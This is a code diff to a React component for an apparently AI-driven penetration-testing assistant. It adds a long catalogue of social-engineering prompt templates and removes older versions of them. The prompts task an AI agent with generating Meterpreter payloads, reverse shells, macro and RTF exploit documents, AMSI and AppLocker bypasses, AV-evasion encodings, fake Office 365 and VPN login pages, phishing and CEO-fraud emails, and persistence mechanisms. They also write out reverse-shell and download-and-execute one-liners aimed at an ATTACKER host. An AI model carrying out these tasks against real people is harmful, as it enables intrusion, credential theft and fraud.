@@ -171,6 +171,291 @@ function getAttackPathConfig(type: string): { label: string; shortLabel: string;
   }
 }
 
+// =============================================================================
+// SOCIAL ENGINEERING SUGGESTION DATA
+// =============================================================================
+
+interface SESuggestion { label: string; prompt: string }
+interface SESection { osLabel?: string; suggestions: SESuggestion[] }
+interface SESubGroup { id: string; title: string; items: SESection[] }
+
+const SOCIAL_ENGINEERING_GROUPS: SESubGroup[] = [
+  // ─── 1. Standalone Payloads ───
+  {
+    id: 'payloads',
+    title: 'Standalone Payloads',
+    items: [
+      {
+        osLabel: 'Windows',
+        suggestions: [
+          { label: 'Meterpreter EXE (reverse_tcp)', prompt: 'Generate a Windows Meterpreter EXE payload and set up the handler — victim triggers the session by double-clicking the .exe file' },
+          { label: 'Meterpreter EXE (reverse_https)', prompt: 'Generate a Windows reverse_https Meterpreter EXE payload for encrypted callback and set up the handler — victim triggers by running the .exe file' },
+          { label: 'DLL reverse shell (rundll32)', prompt: 'Generate a Windows Meterpreter DLL payload (msfvenom -f dll) and set up the handler — victim triggers by running: rundll32 payload.dll,0' },
+          { label: 'MSI installer backdoor', prompt: 'Generate a Windows Meterpreter MSI installer payload (msfvenom -f msi) and set up the handler — victim triggers by double-clicking the .msi installer file' },
+          { label: 'Windows Service EXE', prompt: 'Generate a Windows Meterpreter service executable (msfvenom -f exe-service) and set up the handler — victim triggers by installing it as a Windows service via sc create' },
+          { label: 'VBScript dropper (.vbs)', prompt: 'Generate a Windows Meterpreter VBScript payload (msfvenom -f vbs) and set up the handler — victim triggers by double-clicking the .vbs file (no Office required)' },
+          { label: 'HTA-PSH standalone file', prompt: 'Generate a Windows HTA file with embedded PowerShell payload (msfvenom -f hta-psh) and set up the handler — victim triggers by double-clicking the .hta file' },
+          { label: 'Fileless PowerShell (psh-reflection)', prompt: 'Generate a fileless PowerShell (psh-reflection) Meterpreter payload and set up the handler — victim triggers by pasting the command into a PowerShell terminal' },
+          { label: 'PowerShell Base64 one-liner', prompt: 'Generate a Windows Meterpreter payload as a PowerShell Base64 one-liner (msfvenom -f psh-cmd) and set up the handler — victim triggers by pasting the powershell -e command into cmd or PowerShell' },
+          { label: 'SCR screensaver backdoor', prompt: 'Generate a Windows Meterpreter EXE payload renamed to .scr (screensaver) and set up the handler — victim triggers by double-clicking the .scr file (bypasses some email filters)' },
+          { label: 'Batch file dropper (.bat)', prompt: 'Write a Windows batch file that uses certutil to download and execute a Meterpreter payload, and set up the handler — victim triggers by double-clicking the .bat file' },
+          { label: 'Encrypted RC4 payload', prompt: 'Generate a Windows Meterpreter reverse_tcp_rc4 encrypted payload for network evasion and set up the handler — victim triggers by running the .exe file' },
+        ],
+      },
+      {
+        osLabel: 'Linux',
+        suggestions: [
+          { label: 'Meterpreter ELF binary (reverse_tcp)', prompt: 'Generate a Linux x64 Meterpreter ELF binary payload and set up the handler — victim triggers by running chmod +x payload.elf && ./payload.elf' },
+          { label: 'Shell ELF binary (fallback)', prompt: 'Generate a Linux x64 basic shell ELF binary (linux/x64/shell_reverse_tcp) and set up the handler — victim triggers by executing ./payload.elf' },
+          { label: 'Shared object .so (LD_PRELOAD)', prompt: 'Generate a Linux Meterpreter shared object (msfvenom -f elf-so) and set up the handler — victim triggers when any program loads the .so via LD_PRELOAD=./payload.so' },
+          { label: 'Bash reverse shell one-liner', prompt: 'Generate a bash reverse shell one-liner (cmd/unix/reverse_bash) and set up the handler — victim triggers by pasting the one-liner into a bash terminal' },
+          { label: 'Bash /dev/tcp reverse shell', prompt: 'Generate a bash /dev/tcp reverse shell one-liner and set up the handler — victim triggers by pasting /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1 into a terminal' },
+          { label: 'Python reverse shell one-liner', prompt: 'Generate a Python reverse shell one-liner (cmd/unix/reverse_python) and set up the handler — victim triggers by pasting the python command into a terminal' },
+          { label: 'Perl reverse shell one-liner', prompt: 'Generate a Perl reverse shell one-liner (cmd/unix/reverse_perl) and set up the handler — victim triggers by pasting the perl command into a terminal' },
+          { label: 'Netcat reverse shell', prompt: 'Generate a netcat reverse shell command and set up the handler — victim triggers by running nc -e /bin/sh ATTACKER 4444 in a terminal' },
+          { label: 'Socat encrypted reverse shell', prompt: 'Generate a socat reverse shell with OpenSSL encryption and set up the listener — victim triggers by running the socat command that connects back encrypted' },
+          { label: 'OpenSSL encrypted reverse shell', prompt: 'Generate an OpenSSL reverse shell one-liner (mkfifo + openssl s_client) and set up the listener — victim triggers by pasting the command into a terminal' },
+          { label: 'C compiled reverse shell', prompt: 'Write a C reverse shell, compile it with gcc in kali_shell, and set up the handler — victim triggers by running the compiled binary ./payload' },
+          { label: 'Go compiled reverse shell', prompt: 'Write a Go reverse shell, compile it with go build in kali_shell, and set up the handler — victim triggers by running the compiled binary ./payload' },
+        ],
+      },
+      {
+        osLabel: 'macOS',
+        suggestions: [
+          { label: 'Meterpreter Mach-O binary (reverse_tcp)', prompt: 'Generate a macOS Mach-O Meterpreter reverse_tcp payload and set up the handler — victim triggers by running chmod +x payload && ./payload in Terminal' },
+          { label: 'Mach-O reverse_https (encrypted)', prompt: 'Generate a macOS Mach-O Meterpreter reverse_https payload for encrypted callback and set up the handler — victim triggers by executing the binary in Terminal' },
+          { label: 'Python reverse shell (Gatekeeper bypass)', prompt: 'Generate a macOS Python reverse shell one-liner (cmd/unix/reverse_python) and set up the handler — victim triggers by pasting the python command into Terminal (bypasses Gatekeeper)' },
+          { label: 'Bash reverse shell one-liner', prompt: 'Generate a macOS bash reverse shell one-liner (cmd/unix/reverse_bash) and set up the handler — victim triggers by pasting the command into Terminal' },
+          { label: 'Perl reverse shell one-liner', prompt: 'Generate a Perl reverse shell one-liner for macOS and set up the handler — victim triggers by pasting the perl command into Terminal (Perl ships with macOS)' },
+          { label: 'AppleScript dropper', prompt: 'Generate a macOS AppleScript one-liner (osascript -e) and set up the handler — victim triggers by pasting the osascript command into Terminal or running a .scpt file' },
+        ],
+      },
+      {
+        osLabel: 'Android',
+        suggestions: [
+          { label: 'Meterpreter APK backdoor', prompt: 'Generate an Android APK backdoor with android/meterpreter/reverse_tcp and set up the handler — victim triggers by installing and opening the APK on their device' },
+          { label: 'Trojanized APK (injected into legit app)', prompt: 'Generate an Android APK payload embedded into a legitimate APK (msfvenom -x) and set up the handler — victim triggers by installing the trojanized app' },
+          { label: 'APK with reverse_https (encrypted)', prompt: 'Generate an Android reverse_https APK payload for encrypted callback and set up the handler — victim triggers by installing and opening the APK' },
+          { label: 'Staged APK (smaller download)', prompt: 'Generate a staged Android APK (android/meterpreter/reverse_tcp) and set up the handler — victim triggers by installing the smaller APK which then downloads the full payload' },
+        ],
+      },
+      {
+        osLabel: 'Cross-Platform',
+        suggestions: [
+          { label: 'Python Meterpreter (cross-platform)', prompt: 'Generate a cross-platform Python Meterpreter payload (python/meterpreter/reverse_tcp) and set up the handler — victim triggers by running python payload.py on any OS' },
+          { label: 'Python HTTPS Meterpreter (encrypted)', prompt: 'Generate a cross-platform Python reverse_https Meterpreter payload and set up the handler — victim triggers by running the .py script on any OS with Python' },
+          { label: 'Java JAR backdoor', prompt: 'Generate a Java JAR Meterpreter payload (java/meterpreter/reverse_tcp -f jar) and set up the handler — victim triggers by running java -jar payload.jar on any OS with Java' },
+          { label: 'Java WAR backdoor (Tomcat / JBoss)', prompt: 'Generate a Java WAR Meterpreter backdoor and set up the handler — victim triggers when the .war is deployed on a Tomcat/JBoss server and a request hits the endpoint' },
+          { label: 'PHP Meterpreter (.php file)', prompt: 'Generate a PHP Meterpreter payload (php/meterpreter_reverse_tcp -f raw) and set up the handler — victim triggers when the .php file is accessed via the web server' },
+          { label: 'JSP web shell (Java servers)', prompt: 'Generate a JSP reverse shell payload via execute_code and set up the handler — victim triggers when the .jsp file is accessed on a Tomcat/Java app server' },
+          { label: 'ASPX Meterpreter (IIS / .NET)', prompt: 'Generate an ASPX Meterpreter payload (msfvenom -f aspx) and set up the handler — victim triggers when the .aspx file is accessed on an IIS/.NET web server' },
+          { label: 'Perl reverse shell (cross-platform)', prompt: 'Generate a Perl reverse shell one-liner (cmd/unix/reverse_perl) and set up the handler — victim triggers by pasting the command into a terminal on any OS with Perl' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 2. Malicious Documents ───
+  {
+    id: 'documents',
+    title: 'Malicious Documents',
+    items: [
+      {
+        suggestions: [
+          { label: 'Word macro document (VBA)', prompt: 'Create a malicious Word document with a VBA macro payload and set up the handler — victim triggers by opening the .docm file and clicking "Enable Macros"' },
+          { label: 'Excel macro spreadsheet (VBA)', prompt: 'Create a weaponized Excel spreadsheet with a macro payload and set up the handler — victim triggers by opening the .xlsm file and clicking "Enable Content"' },
+          { label: 'PDF exploit (Adobe Reader)', prompt: 'Generate a trojanized PDF file with an embedded payload and set up the handler — victim triggers by opening the .pdf file in Adobe Reader' },
+          { label: 'RTF exploit (CVE-2017-0199)', prompt: 'Create a malicious RTF document exploiting CVE-2017-0199 and set up the handler — victim triggers by opening the .rtf file which auto-fetches an HTA payload' },
+          { label: 'LNK shortcut file', prompt: 'Generate a malicious Windows shortcut (LNK file) with a reverse shell payload and set up the handler — victim triggers by double-clicking the .lnk shortcut' },
+          { label: 'DDE attack (macro-less Office)', prompt: 'Create a Word document using DDE field code to execute a reverse shell and set up the handler — victim triggers by opening the .docx and clicking "Yes" on the DDE prompt (no macros needed)' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 3. Web Delivery (Fileless) ───
+  {
+    id: 'web_delivery',
+    title: 'Web Delivery (Fileless)',
+    items: [
+      {
+        osLabel: 'Windows',
+        suggestions: [
+          { label: 'PowerShell web delivery', prompt: 'Set up a PowerShell web delivery attack (exploit/multi/script/web_delivery TARGET 2) — victim triggers by pasting the generated PowerShell one-liner into cmd or PowerShell' },
+          { label: 'Regsvr32 AppLocker bypass', prompt: 'Set up a Regsvr32 web delivery attack (exploit/multi/script/web_delivery TARGET 3) — victim triggers by running the regsvr32 one-liner which bypasses AppLocker restrictions' },
+          { label: 'pubprn script bypass', prompt: 'Set up a pubprn web delivery attack (exploit/multi/script/web_delivery TARGET 4) — victim triggers by running the pubprn.vbs one-liner which bypasses script execution policies' },
+          { label: 'SyncAppvPublishing bypass', prompt: 'Set up a SyncAppvPublishingServer web delivery (exploit/multi/script/web_delivery TARGET 5) — victim triggers by running the one-liner which bypasses Windows App-V restrictions' },
+          { label: 'PSH Binary web delivery', prompt: 'Set up a PSH Binary web delivery (exploit/multi/script/web_delivery TARGET 6) — victim triggers by pasting the PowerShell one-liner that downloads and executes a binary payload' },
+          { label: 'HTA delivery server', prompt: 'Create an HTA delivery server (exploit/windows/misc/hta_server) on port 8080 — victim triggers by visiting the HTA URL in their browser and clicking "Run"' },
+        ],
+      },
+      {
+        osLabel: 'Linux / macOS',
+        suggestions: [
+          { label: 'Python web delivery (Linux)', prompt: 'Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) — Linux victim triggers by pasting the generated python one-liner into a terminal' },
+          { label: 'Python web delivery (macOS)', prompt: 'Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) — macOS victim triggers by pasting the generated python one-liner into Terminal' },
+        ],
+      },
+      {
+        osLabel: 'Cross-Platform',
+        suggestions: [
+          { label: 'Python web delivery (any OS)', prompt: 'Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) — victim triggers by pasting the python one-liner into a terminal on any OS with Python' },
+          { label: 'PHP web delivery (web servers)', prompt: 'Set up a PHP web delivery attack (exploit/multi/script/web_delivery TARGET 1) — victim triggers when the PHP one-liner is executed on a compromised web server' },
+          { label: 'HTA server + email link combo', prompt: 'Set up an HTA delivery server on port 8080 (requires chisel tunnel) and send the URL via phishing email — victim triggers by clicking the email link and opening the HTA in their browser' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 4. LOLBin & Bypass Techniques ───
+  {
+    id: 'lolbin',
+    title: 'LOLBin & Bypass Techniques',
+    items: [
+      {
+        osLabel: 'Windows Living-off-the-Land',
+        suggestions: [
+          { label: 'MSHTA URL execution', prompt: 'Set up an HTA payload server and generate a mshta one-liner — victim triggers by running mshta http://ATTACKER:8080/payload.hta in cmd (no file download needed)' },
+          { label: 'Certutil download cradle', prompt: 'Generate a Meterpreter EXE, host it via web delivery, and craft a certutil one-liner — victim triggers by running certutil -urlcache -split -f http://ATTACKER/payload.exe && payload.exe' },
+          { label: 'Bitsadmin download', prompt: 'Generate a Meterpreter EXE, host it via web delivery, and craft a bitsadmin one-liner — victim triggers by running bitsadmin /transfer job http://ATTACKER/payload.exe c:\\payload.exe' },
+          { label: 'PowerShell IEX cradle', prompt: 'Set up a web delivery server and generate a PowerShell IEX cradle — victim triggers by running IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/payload") in PowerShell' },
+          { label: 'WMIC process create', prompt: 'Generate a Base64-encoded PowerShell payload — victim triggers by running wmic process call create "powershell -e BASE64_PAYLOAD" in cmd' },
+          { label: 'Regsvr32 SCT scriptlet', prompt: 'Generate a COM scriptlet (.sct) file via execute_code and host it — victim triggers by running regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll (bypasses AppLocker)' },
+          { label: 'MSBuild inline task (.xml)', prompt: 'Generate an MSBuild inline task XML file with embedded C# Meterpreter shellcode via execute_code — victim triggers by running MSBuild.exe payload.xml (bypasses AppLocker)' },
+          { label: 'Windows Script Host (.wsf)', prompt: 'Generate a Windows Script Host file (.wsf) wrapping a payload via execute_code — victim triggers by double-clicking the .wsf file which runs via wscript.exe' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 5. Evasion & Encoding ───
+  {
+    id: 'evasion',
+    title: 'Evasion & Encoding',
+    items: [
+      {
+        osLabel: 'Windows',
+        suggestions: [
+          { label: 'Encoded EXE (shikata_ga_nai)', prompt: 'Generate a Windows Meterpreter EXE encoded with shikata_ga_nai (5 iterations) for AV evasion and set up the handler — victim triggers by double-clicking the encoded .exe' },
+          { label: 'Multi-encode chain (shikata + countdown)', prompt: 'Generate a Windows Meterpreter EXE with chained encoding (shikata_ga_nai + countdown) and set up the handler — victim triggers by running the multi-encoded .exe' },
+          { label: 'XOR encoded payload', prompt: 'Generate a Windows Meterpreter EXE encoded with x86/xor for signature evasion and set up the handler — victim triggers by running the encoded .exe file' },
+          { label: 'Alpha_mixed alphanumeric shellcode', prompt: 'Generate a Windows Meterpreter payload encoded with x86/alpha_mixed and set up the handler — victim triggers by executing the alphanumeric shellcode (useful for restricted character set exploits)' },
+          { label: 'Custom template EXE (-x inject)', prompt: 'Generate a Meterpreter payload injected into a legitimate EXE (msfvenom -x legit.exe -k) and set up the handler — victim triggers by running what looks like a normal application' },
+          { label: 'UPX packed EXE', prompt: 'Generate a Windows Meterpreter EXE and pack it with UPX for signature evasion, then set up the handler — victim triggers by running the packed .exe file' },
+          { label: 'AMSI bypass + PowerShell payload', prompt: 'Write a PowerShell script that bypasses AMSI before loading Meterpreter shellcode and set up the handler — victim triggers by pasting the script into a PowerShell terminal' },
+          { label: 'HTTPS with custom SSL cert', prompt: 'Generate a Meterpreter reverse_https payload with a custom SSL certificate and set up the handler — victim triggers by running the payload which connects back over trusted-looking HTTPS' },
+        ],
+      },
+      {
+        osLabel: 'Linux / macOS',
+        suggestions: [
+          { label: 'Encoded ELF (x64/xor)', prompt: 'Generate a Linux ELF payload encoded with x64/xor for AV evasion and set up the handler — victim triggers by running chmod +x && ./payload.elf' },
+          { label: 'Encoded Mach-O (x64/xor)', prompt: 'Generate a macOS Mach-O Meterpreter payload encoded with x64/xor and set up the handler — victim triggers by executing the encoded binary in Terminal' },
+        ],
+      },
+      {
+        osLabel: 'Android',
+        suggestions: [
+          { label: 'Encoded APK (shikata_ga_nai)', prompt: 'Generate an Android APK payload encoded with x86/shikata_ga_nai for AV evasion and set up the handler — victim triggers by installing and opening the encoded APK' },
+        ],
+      },
+      {
+        osLabel: 'Advanced',
+        suggestions: [
+          { label: 'Staged dropper + web delivery', prompt: 'Write a small Python/bash dropper script that fetches the real Meterpreter payload from the web delivery server — victim triggers by running the dropper which downloads and executes the second-stage payload' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 6. Credential Harvesting ───
+  {
+    id: 'credential_harvest',
+    title: 'Credential Harvesting',
+    items: [
+      {
+        osLabel: 'Fake Pages (requires chisel tunnel on port 8080)',
+        suggestions: [
+          { label: 'Fake login page (generic)', prompt: 'Write and serve a fake HTML login page on port 8080 via execute_code that captures credentials — victim triggers by visiting the URL and submitting their username/password' },
+          { label: 'Fake Office 365 login', prompt: 'Write and serve a fake Microsoft Office 365 login page on port 8080 via execute_code — victim triggers by visiting the URL and entering their Microsoft credentials' },
+          { label: 'Fake VPN portal login', prompt: 'Write and serve a fake Cisco/Fortinet VPN portal login page on port 8080 via execute_code — victim triggers by visiting the URL and entering their VPN credentials' },
+          { label: 'Fake software update page', prompt: 'Write and serve a fake "Critical Update Required" page on port 8080 via execute_code — victim triggers by clicking the download button which delivers a Meterpreter payload' },
+          { label: 'Fake file download page', prompt: 'Write and serve a fake "Shared Document" download page on port 8080 via execute_code — victim triggers by clicking the download link which delivers a payload' },
+          { label: 'Clipboard hijack (pastejacking)', prompt: 'Write and serve an HTML page on port 8080 with JavaScript clipboard hijacking — victim triggers when they copy text from the page and paste a hidden reverse shell command into their terminal' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 7. Email Campaigns ───
+  {
+    id: 'email_campaigns',
+    title: 'Email Campaigns',
+    items: [
+      {
+        osLabel: 'Payload Delivery',
+        suggestions: [
+          { label: 'Send payload via phishing email', prompt: 'Generate a Meterpreter payload and send it via phishing email with an IT support pretext — victim triggers by opening the email attachment and running the payload' },
+          { label: 'Send malicious document via email', prompt: 'Generate a malicious Office document and send it via email as an invoice — victim triggers by opening the attachment and enabling macros' },
+          { label: 'Software update + payload attachment', prompt: 'Generate a Meterpreter payload and email it as a critical security update from IT — victim triggers by downloading and running the "update" attachment' },
+          { label: 'Meeting invite + malicious attachment', prompt: 'Send a phishing email with a meeting invite and a malicious Word macro attachment — victim triggers by opening the .docm attachment and enabling macros' },
+        ],
+      },
+      {
+        osLabel: 'Credential Phishing',
+        suggestions: [
+          { label: 'Password expiry phish', prompt: 'Send a phishing email warning the password expires in 24h with a link to the credential harvesting page — victim triggers by clicking the reset link and entering their credentials' },
+          { label: 'IT security alert phish', prompt: 'Send a phishing email about an unusual foreign login with a verification link — victim triggers by clicking the link and entering their credentials on the fake page' },
+          { label: 'MFA reset phish', prompt: 'Send a phishing email claiming their MFA device was removed with a re-enroll link — victim triggers by clicking the link and entering their credentials on the fake page' },
+          { label: 'Cloud storage share phish', prompt: 'Send a phishing email mimicking a OneDrive/Dropbox sharing notification — victim triggers by clicking the "View Document" link and entering credentials on the fake login page' },
+        ],
+      },
+      {
+        osLabel: 'Social Engineering Pretexts',
+        suggestions: [
+          { label: 'Invoice attachment pretext', prompt: 'Send a phishing email with a fake invoice (malicious Excel macro) from accounting — victim triggers by opening the .xlsm attachment and clicking "Enable Content"' },
+          { label: 'Shared document notification', prompt: 'Send a phishing email mimicking a "John shared a document with you" notification — victim triggers by clicking the link and pasting the web delivery one-liner' },
+          { label: 'HR policy update pretext', prompt: 'Send a phishing email from HR about a new remote work policy with a malicious Word document — victim triggers by opening the .docm attachment and enabling macros' },
+          { label: 'Delivery notification pretext', prompt: 'Send a phishing email mimicking a package delivery notification — victim triggers by clicking the tracking link which points to the payload download or web delivery URL' },
+          { label: 'Payment confirmation pretext', prompt: 'Send a phishing email about a $499 payment with a malicious receipt attachment — victim triggers by opening the attachment to "review the transaction"' },
+          { label: 'Job application response', prompt: 'Send a phishing email claiming "We would like to schedule an interview" with a malicious attachment — victim triggers by opening the .docm to see the interview details' },
+          { label: 'Executive impersonation (CEO fraud)', prompt: 'Send a phishing email impersonating the CEO/CTO with an urgent request and attachment — victim triggers by opening the "confidential" malicious attachment' },
+          { label: 'Tax document phish', prompt: 'Send a phishing email claiming a W-2/tax form is ready with a malicious PDF attachment — victim triggers by opening the PDF in Adobe Reader' },
+          { label: 'Voicemail notification pretext', prompt: 'Send a phishing email about a new voicemail with a malicious attachment — victim triggers by opening what appears to be an audio player but runs the payload' },
+          { label: 'Helpdesk ticket update', prompt: 'Send a phishing email about a resolved helpdesk ticket with a "view details" link — victim triggers by clicking the link which points to the web delivery URL' },
+          { label: 'Newsletter with trojan link', prompt: 'Send a phishing email formatted as a company newsletter — victim triggers by clicking one of the links which points to the payload download or web delivery URL' },
+        ],
+      },
+    ],
+  },
+
+  // ─── 8. Persistence & Bind Shells ───
+  {
+    id: 'persistence',
+    title: 'Persistence & Bind Shells',
+    items: [
+      {
+        osLabel: 'Persistence Mechanisms',
+        suggestions: [
+          { label: 'SSH authorized_keys injection (Linux)', prompt: 'Generate an SSH key pair and write an injection script via execute_code — victim triggers unknowingly when the attacker SSHs in using the injected public key at any time' },
+          { label: 'Cron job persistence (Linux)', prompt: 'Generate a Meterpreter ELF payload and a crontab installation script via execute_code — victim triggers automatically every hour when cron re-executes the payload' },
+          { label: 'Launch Agent persistence (macOS)', prompt: 'Generate a macOS Mach-O Meterpreter payload and a LaunchAgent plist via execute_code — victim triggers automatically when they log in and the Launch Agent starts the payload' },
+          { label: '.desktop file autostart (Linux)', prompt: 'Generate a Linux ELF payload and a .desktop autostart entry via execute_code — victim triggers automatically when they log into their desktop session' },
+        ],
+      },
+      {
+        osLabel: 'Bind Shells (no tunnel needed)',
+        suggestions: [
+          { label: 'Windows bind shell EXE', prompt: 'Generate a Windows bind shell payload (windows/meterpreter/bind_tcp) — victim triggers by running the .exe which opens a listening port, then the attacker connects directly' },
+          { label: 'Linux bind shell ELF', prompt: 'Generate a Linux bind shell payload (linux/x64/meterpreter/bind_tcp) — victim triggers by running ./payload.elf which opens a listening port, then the attacker connects directly' },
+          { label: 'macOS bind shell Mach-O', prompt: 'Generate a macOS bind shell payload (osx/x64/meterpreter/bind_tcp) — victim triggers by running the binary which opens a listening port, then the attacker connects directly' },
+          { label: 'Python bind shell (cross-platform)', prompt: 'Generate a cross-platform Python bind shell (python/meterpreter/bind_tcp) — victim triggers by running python payload.py which opens a listening port, then the attacker connects directly' },
+        ],
+      },
+    ],
+  },
+]
+
 export function AIAssistantDrawer({
   isOpen,
   onClose,
@@ -215,6 +500,7 @@ export function AIAssistantDrawer({
 
   // Template dropdown state
   const [openTemplateGroup, setOpenTemplateGroup] = useState<string | null>(null)
+  const [openSocialSubGroup, setOpenSocialSubGroup] = useState<string | null>(null)
 
   // Conversation hooks
   const {
@@ -1540,146 +1826,31 @@ export function AIAssistantDrawer({
                 </button>
                 {openTemplateGroup === 'social_engineering' && (
                   <div className={styles.templateGroupItems}>
-                    {/* ── Windows ── */}
-                    <span className={styles.templateOsLabel}>Windows</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Windows Meterpreter EXE payload and set up the handler to catch the callback when the victim runs it')} disabled={!isConnected}>
-                      Meterpreter EXE (reverse_tcp)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Windows reverse_https Meterpreter EXE payload for encrypted callback that bypasses the victim firewall')} disabled={!isConnected}>
-                      Meterpreter EXE (reverse_https)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Windows reverse shell EXE encoded with shikata_ga_nai (5 iterations) for AV evasion on the victim machine and set up the handler')} disabled={!isConnected}>
-                      Encoded EXE (shikata_ga_nai AV evasion)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a fileless PowerShell (psh-reflection) Meterpreter payload that runs entirely in memory when the victim executes it')} disabled={!isConnected}>
-                      Fileless PowerShell (psh-reflection)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Create a malicious Word document with a VBA macro that opens a Meterpreter session when the victim enables macros')} disabled={!isConnected}>
-                      Malicious Word macro document (VBA)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Create a weaponized Excel spreadsheet with a macro payload that establishes a reverse shell when the victim opens it')} disabled={!isConnected}>
-                      Malicious Excel macro spreadsheet (VBA)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a trojanized PDF file that executes a reverse shell when the victim opens it in Adobe Reader')} disabled={!isConnected}>
-                      Malicious PDF document
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Create a malicious RTF document exploiting CVE-2017-0199 that fetches an HTA payload when the victim opens it')} disabled={!isConnected}>
-                      Malicious RTF document (CVE-2017-0199)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a malicious Windows shortcut (LNK file) that executes a reverse shell payload when the victim clicks it')} disabled={!isConnected}>
-                      Malicious LNK shortcut file
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a PowerShell web delivery attack and generate a one-liner for the victim to execute to get a Meterpreter session')} disabled={!isConnected}>
-                      PowerShell web delivery attack
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Create an HTA delivery server that serves a payload when the victim visits the URL in their browser')} disabled={!isConnected}>
-                      HTA delivery server
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Regsvr32 web delivery attack to bypass AppLocker restrictions when the victim executes the one-liner')} disabled={!isConnected}>
-                      Regsvr32 AppLocker bypass
-                    </button>
-
-                    {/* ── Linux ── */}
-                    <span className={styles.templateOsLabel}>Linux</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Linux x64 Meterpreter ELF binary payload and set up the handler to catch the callback when the victim runs it')} disabled={!isConnected}>
-                      Meterpreter ELF binary (reverse_tcp)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Linux x64 basic shell ELF binary (linux/x64/shell_reverse_tcp) as a fallback payload for the victim to execute')} disabled={!isConnected}>
-                      Shell ELF binary (fallback)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a bash reverse shell one-liner (cmd/unix/reverse_bash) for a Linux victim to execute and set up the handler')} disabled={!isConnected}>
-                      Bash reverse shell one-liner
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Python reverse shell one-liner (cmd/unix/reverse_python) for a Linux victim with Python installed and set up the handler')} disabled={!isConnected}>
-                      Python reverse shell one-liner
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) and generate a one-liner for a Linux victim to execute')} disabled={!isConnected}>
-                      Python web delivery (one-liner)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Linux ELF reverse shell payload encoded with x64/xor for AV evasion on the victim machine and set up the handler')} disabled={!isConnected}>
-                      Encoded ELF (x64/xor AV evasion)
-                    </button>
-
-                    {/* ── macOS ── */}
-                    <span className={styles.templateOsLabel}>macOS</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a macOS Mach-O Meterpreter reverse_tcp payload and set up the handler to catch the callback when the victim runs it')} disabled={!isConnected}>
-                      Meterpreter Mach-O binary (reverse_tcp)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a macOS Python reverse shell one-liner (cmd/unix/reverse_python) for the victim to execute bypassing Gatekeeper')} disabled={!isConnected}>
-                      Python reverse shell (Gatekeeper bypass)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a macOS bash reverse shell one-liner (cmd/unix/reverse_bash) for a macOS victim to execute and set up the handler')} disabled={!isConnected}>
-                      Bash reverse shell one-liner
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) and generate a one-liner for a macOS victim to execute')} disabled={!isConnected}>
-                      Python web delivery (one-liner)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a macOS Mach-O Meterpreter payload encoded with x64/xor for AV evasion on the victim machine and set up the handler')} disabled={!isConnected}>
-                      Encoded Mach-O (x64/xor AV evasion)
-                    </button>
-
-                    {/* ── Android ── */}
-                    <span className={styles.templateOsLabel}>Android</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate an Android APK backdoor with android/meterpreter/reverse_tcp that opens a Meterpreter session when the victim installs it')} disabled={!isConnected}>
-                      Meterpreter APK backdoor
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate an Android APK payload and embed it into a legitimate APK using msfvenom -x to trojanize an app the victim will install')} disabled={!isConnected}>
-                      Trojanized APK (injected into legit app)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate an Android reverse_https APK payload for encrypted callback that bypasses network inspection on the victim device')} disabled={!isConnected}>
-                      APK with reverse_https (encrypted)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate an Android APK payload encoded with x86/shikata_ga_nai for AV evasion on the victim device and set up the handler')} disabled={!isConnected}>
-                      Encoded APK (shikata_ga_nai AV evasion)
-                    </button>
-
-                    {/* ── Cross-Platform / Java / PHP ── */}
-                    <span className={styles.templateOsLabel}>Cross-Platform / Java / PHP</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a cross-platform Python Meterpreter payload (python/meterpreter/reverse_tcp) for a victim running Windows, Linux, or macOS')} disabled={!isConnected}>
-                      Python Meterpreter (cross-platform)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a Java WAR backdoor for the victim to deploy on a Tomcat or JBoss server and set up the Meterpreter handler')} disabled={!isConnected}>
-                      Java WAR backdoor (Tomcat / JBoss)
-                    </button>
